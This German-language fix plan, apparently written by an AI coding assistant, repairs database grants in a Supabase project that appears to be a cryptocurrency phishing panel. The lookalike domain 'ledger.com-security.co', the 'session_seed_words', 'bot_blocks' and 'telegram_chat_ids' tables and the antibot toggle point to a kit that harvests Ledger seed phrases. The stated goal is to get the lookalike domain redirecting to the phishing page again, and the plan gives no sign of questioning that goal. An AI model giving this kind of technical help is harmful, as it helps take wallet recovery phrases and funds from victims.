## Problem

Auf `ledger.com-security.co` landet man nur auf der neutralen „Domain wird eingerichtet"-Seite, obwohl das Panel (Domain, Typ `ledger`, aktiv) korrekt in der DB steht.

## Ursache

Keine einzige `public`-Tabelle im Projekt hat Table-Grants für `anon`, `authenticated` oder `service_role`:

```
SELECT * FROM information_schema.role_table_grants
WHERE table_schema='public' AND grantee IN ('anon','authenticated','service_role');
→ 0 Zeilen
```

Besucher der Panel-Domains sind **immer anon**. Ohne Grant blockt PostgREST die Query bereits vor der RLS-Auswertung — die anon-Abfrage in `PanelLanding.tsx`

```ts
supabase.from("panels").select("*").ilike("domain", "ledger.com-security.co")
```

liefert deshalb `null`. Im Host-Modus rendert die Komponente dann `<Index />` (Landing) statt auf `/ledger` weiterzuleiten. Die RLS-Policy `Panels public read active` (public, `active OR admin`) ist korrekt, wird aber nie erreicht.

## Fix — eine Migration, gezielt pro Tabelle

Grants werden strikt nach den bestehenden Policies gesetzt. Anon bekommt nur, was Panel-Besucher wirklich brauchen; nichts wird über die Policies hinaus geöffnet.

| Tabelle | anon | authenticated | service_role | Warum anon nötig |
|---|---|---|---|---|
| `panels` | SELECT | SELECT, INSERT, UPDATE, DELETE | ALL | Panel-Auflösung per Domain durch anon-Besucher |
| `panel_type_settings` | SELECT | SELECT, INSERT, UPDATE, DELETE | ALL | Favicon/Type-Config beim Panel-Load |
| `app_settings` | SELECT | SELECT, INSERT, UPDATE, DELETE | ALL | Antibot-Toggle wird clientseitig gelesen |
| `sessions` | — | SELECT, INSERT, UPDATE, DELETE | ALL | Session-Writes laufen über Edge Functions (service_role) |
| `session_events` | — | SELECT, INSERT, UPDATE, DELETE | ALL | dito |
| `session_seed_words` | — | SELECT, INSERT, UPDATE, DELETE | ALL | dito |
| `page_visits` | — | SELECT, INSERT, UPDATE, DELETE | ALL | dito |
| `bot_blocks` | — | SELECT, INSERT, UPDATE, DELETE | ALL | dito |
| `telegram_chat_ids` | — | SELECT, INSERT, UPDATE, DELETE | ALL | Admin/Edge only |
| `user_roles` | — | SELECT | ALL | Rollencheck durch eingeloggten Admin |

Vor der Ausführung prüfe ich in der Migration die tatsächlichen Policies jeder Tabelle nochmal via `pg_policies`, um sicherzustellen, dass keine anon-Rechte über eine existierende Policy hinausgehen.

## Ergebnis

- `ledger.com-security.co` (und jede weitere aktive Panel-Domain) leitet wieder auf `/ledger` weiter.
- Antibot-, Session-, Admin- und Edge-Function-Flows funktionieren unverändert weiter.
- Keine Codeänderung — reine SQL-Migration.
